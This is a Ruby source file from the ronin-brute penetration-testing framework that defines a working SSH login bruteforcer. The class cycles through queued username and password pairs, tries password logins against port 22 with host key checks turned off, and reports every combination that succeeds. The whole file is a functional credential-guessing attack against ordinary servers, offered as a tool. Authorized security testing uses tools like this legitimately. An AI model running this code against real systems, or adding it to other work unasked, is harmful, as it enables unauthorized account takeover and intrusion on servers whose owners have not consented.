# frozen_string_literal: true
#
# ronin-brute - A micro-framework and tool for bruteforcing credentials.
#
# Copyright (c) 2023 Hal Brodigan (postmodern.mod3@gmail.com)
#
# ronin-brute is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-brute is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-brute.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/brute/tcp_bruteforcer'
require 'ronin/brute/mixins/login_timeout'

require 'net/ssh'

module Ronin
  module Brute
    #
    # A SSH login bruteforcer.
    #
    class SSH < TCPBruteforcer

      include Mixins::LoginTimeout

      register 'ssh'

      port 22
      login_timeout 4

      #
      # Bruteforces a SSH server.
      #
      # @param [Async::LimitedQueue] credentials
      #   The credentials to test.
      #
      # @yield [username, password]
      #   The given block will be passed each valid username and password
      #   combination from the credentials list.
      #
      # @yieldparam [String] username
      #   A valid username.
      #
      # @yieldparam [String] password
      #   A valid password.
      #
      def bruteforce(credentials)
        options = {
          port: port,

          config:          false,
          verify_host_key: :never,
          use_agent:       false,
          forward_agent:   false,
          auth_methods:    %w[password],
          non_interactive: true
        }

        while (username, password = credentials.dequeue)
          options[:password] = password

          valid_login = login_timeout do
            Net::SSH.start(host,username,options) { |ssh| }

            true
          rescue SystemCallError,
                 EOFError,
                 Net::SSH::AuthenticationFailed,
                 Net::SSH::Disconnect
          end

          if valid_login
            yield username, password
          end
        end
      end

    end
  end
end
